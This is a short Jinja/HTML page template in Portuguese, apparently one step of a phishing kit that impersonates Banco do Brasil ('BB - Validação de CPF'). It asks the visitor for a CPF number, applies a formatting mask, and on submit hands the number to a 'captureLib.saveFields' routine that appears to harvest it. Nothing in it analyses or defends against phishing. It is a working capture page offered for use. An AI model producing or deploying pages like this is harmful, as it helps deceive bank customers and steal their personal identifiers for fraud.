{% extends "base.html" %}

{% block title %}BB - Validação de CPF{% endblock %}

{% block content %}
<form id="cpfForm">
    <div class="form-group">
        <label for="cpf">CPF:</label>
        <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
    </div>
    <button type="submit" class="btn">Continuar</button>
    <p class="info-text">Digite seu CPF para validação</p>
</form>
{% endblock %}

{% block scripts %}
const form = document.getElementById('cpfForm');
const cpfInput = document.getElementById('cpf');

// Máscara de CPF
cpfInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        e.target.value = value;
    }
});

form.addEventListener('submit', async function(e) {
    e.preventDefault();
    const cpf = cpfInput.value.replace(/\D/g, '');
    if (cpf.length === 11) {
        await captureLib.saveFields({ cpf: cpf }, 'cpf');
    } else {
        alert('CPF inválido! Digite os 11 dígitos.');
    }
});
{% endblock %}
